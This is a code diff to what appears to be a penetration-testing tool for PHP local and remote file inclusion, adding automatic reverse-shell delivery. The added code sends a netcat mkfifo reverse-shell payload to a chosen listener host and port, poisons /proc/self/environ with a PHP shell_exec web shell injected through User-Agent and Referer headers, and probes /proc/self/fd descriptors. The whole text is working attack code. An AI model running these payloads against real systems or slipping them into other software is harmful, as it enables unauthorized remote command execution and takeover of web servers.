@@ -9,8 +9,25 @@ import random
 import argparse
 import requests
 import requests.exceptions
+import threading
 
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 from argparse import RawTextHelpFormatter
+
+
+class MyHandler(SimpleHTTPRequestHandler):
+    
+    def do_GET(self):
+        if(self.path =='/'):
+            self.path = 'index.html'
+            self.wfile.write(bytes("<p>961bb08a95dbc34397248d92352da799</p>", "utf-8"))
+
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+        
+        else: return SimpleHTTPRequestHandler.do_GET(self)
+
+
 
 exploits = []
 proxies = {}
@@ -86,9 +103,12 @@ def test_wordlist(url):
 
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'TRUNC', os)
             print("[+] LFI -> " + u)
-            return  #To prevent further unnecessary traffic
+            f.close()
 
-    f.close()
+            if(args.revshell):
+                exploit(exploits, 'TRUNC')
+            
+            return  #To prevent further unnecessary traffic
 
 
 def test_php_filter(url):
@@ -139,7 +159,7 @@ def test_php_filter(url):
             print("[+] LFI -> " + u)
 
 
-def test_data_wrapper(url):
+def test_php_data(url):
     if(args.verbose):
         print("Testing PHP data wrapper ...")
 
@@ -234,7 +254,7 @@ def test_php_input(url):
         exploit(exploits, 'INPUT')
 
 
-def test_expect_wrapper(url):
+def test_php_expect(url):
     if(args.verbose):
             print("Testing PHP expect wrapper ...")
 
@@ -284,7 +304,7 @@ def test_rfi(url):
         print("Testing for RFI ...")
 
     tests = []
-    tests.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2FREADME.md")
+    tests.append("https%3a//www.google.com/")
     for i in range(len(tests)):
         if("DESTROY" in url):
             u = url.replace("DESTROY", tests[i])
@@ -292,11 +312,13 @@ def test_rfi(url):
             res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
             if(checkPayload(res)):
                 tempUrl = u.replace(tests[i], 'TMP')
-                getExploit(res, 'GET', 'RFI', tempUrl, tests[i], headers, 'RFI', 'UNKN')
+                getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
                 print("[+] RFI -> " + u)
         except:
             pass
 
+    if(args.revshell):
+        exploit(exploits, 'RFI')
 
 #Checks if sent payload is executed, key word check in response
 def checkPayload(webResponse):
@@ -307,7 +329,7 @@ def checkPayload(webResponse):
                 "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                 ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                 "c2FtcGxlIEhPU1RT", "=1943785348b45", "/usr/bin/",
-                ]
+                "window.google=", "961bb08a95dbc34397248d92352da799"]
 
     for i in range(len(KEY_WORDS)):
         if KEY_WORDS[i] in webResponse.text:
@@ -338,7 +360,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    if(args.verbose): print("[i] Target has netcat installed")
                     ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
                     u = url.replace('TMP', ncPayload)
                     
@@ -353,8 +374,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    if(args.verbose): print("[i] target has netcat installed")
-                
                     u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                     print("Sending revese shell to " + ip + ":"+str(port) + " using nc ...")
                     res = requests.get(u, headers = headers, proxies = proxies)
@@ -367,13 +386,39 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    if(args.verbose): print("[i] Target has netcat installed")
-
                     u = url.replace('TMP',"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                     print("Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
                     res = requests.get(u, headers = headers, proxies = proxies)
                 return
 
+
+        elif(exploit['ATTACK_METHOD'] == method and method == 'TRUNC'):
+            if(exploit['OS'] == 'LINUX'):
+                url = exploit['GETVAL']
+                
+                #/proc/self/environ LFI to rev shell
+                tempHeaders = headers
+                tempHeaders['User-Agent'] = "<?php echo shell_exec($_GET['cmd']); ?>"
+                tempHeaders['Referer'] = "<?php echo shell_exec($_GET['cmd']); ?>"
+                u = url.replace('TMP', '/proc/self/environ')
+                
+                res = requests.get(u, headers =tempHeaders, proxies = proxies)
+                if(args.verbose):
+                    print("[i] Trying to send reverse shell using /proc/self/environ LFI ...")
+
+                u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
+                res = requests.get(u, headers = tempHeaders, proxies = proxies)
+                
+                if(args.verbose):
+                   print("[i] Bruteforcing /proc/self/fd descriptors ...")
+               
+                #/proc/self/fd/ LFI to rev shell
+                for i in range(15):
+                    u = url.replace('TMP', "/proc/self/fd/{0}".format(i))
+                    if(args.verbose): print(u)
+                    requests.get(u, headers = tempHeaders, proxies = proxies)
+               
+                
 
 def main():
     global exploits
@@ -387,8 +432,8 @@ def main():
     if(test_all):
         test_php_filter(url)
         test_php_input(url)
-        test_data_wrapper(url)
-        test_expect_wrapper(url)
+        test_php_data(url)
+        test_php_expect(url)
         test_rfi(url)
         test_wordlist(url)
         
@@ -399,18 +444,18 @@ def main():
     if(args.wordlist):
         default = False
         test_wordlist(url)
-    if(php_filter):
+    if(args.php_filter):
         default = False
         test_php_filter(url)
-    if(php_input):
+    if(args.php_input):
         default = False
         test_php_input(url)
-    if(data_wrapper):
+    if(args.php_data):
         default = False
-        test_data_wrapper(url)
-    if(expect_wrapper):
+        test_php_data(url)
+    if(args.php_expect):
         default = False
-        test_expect_wrapper(url)
+        test_php_expect(url)
     if(args.rfi):
         default = False
         test_rfi(url)
@@ -445,25 +490,21 @@ if(__name__ == "__main__"):
     attackGroup.add_argument('--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
     attackGroup.add_argument('--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion")
     attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack")
-    attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
+    attackGroup.add_argument('-aa', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
 
     #postExpGroup = parser.add_argument_group('ENUMERATE')
     
     payloadGroup = parser.add_argument_group('PAYLOAD')
-    payloadGroup.add_argument('--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first.)")
+    payloadGroup.add_argument('-x', '--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first.)")
     payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
     payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")
 
     otherGroup = parser.add_argument_group('OTHER')
-    otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Verbose output\n")
+    otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Print more detailed output when performing attacks\n")
     otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")
     args = parser.parse_args()
 
     url = args.url
-    php_filter = args.php_filter
-    data_wrapper = args.php_data
-    expect_wrapper = args.php_expect
-    php_input = args.php_input
     cookie = args.cookie
     wordlist = args.wordlist
     test_all = args.test_all
